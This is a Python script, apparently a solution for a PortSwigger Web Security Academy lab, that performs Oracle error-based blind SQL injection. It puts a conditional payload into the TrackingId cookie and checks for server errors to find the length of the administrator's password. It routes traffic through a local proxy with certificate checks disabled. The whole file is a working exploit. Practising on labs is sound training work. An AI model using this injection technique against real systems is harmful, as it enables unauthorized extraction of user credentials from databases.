#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

for l in range(1,25):
    try:
        
        url = "https://ac2a1fc41f7b9f30c0288f06007700b0.web-security-academy.net"
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        headers = {"Host": "ac2a1fc41f7b9f30c0288f06007700b0.web-security-academy.net",
        "Cookie": "TrackingId=tJBcJEogHX20zKzn'||(SELECT CASE WHEN LENGTH(password)>"+str(l)+" THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=LPTE4K9tEV8b1xyeEBqLcH4loQfboIjt"}
        r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
        
        for x in r.text.split("\n"):
            if "Internal Server Error" in x:
                 print("[+] Password length:",l+1,end="\r")
    except:
        print("An exception occurred")
        exit()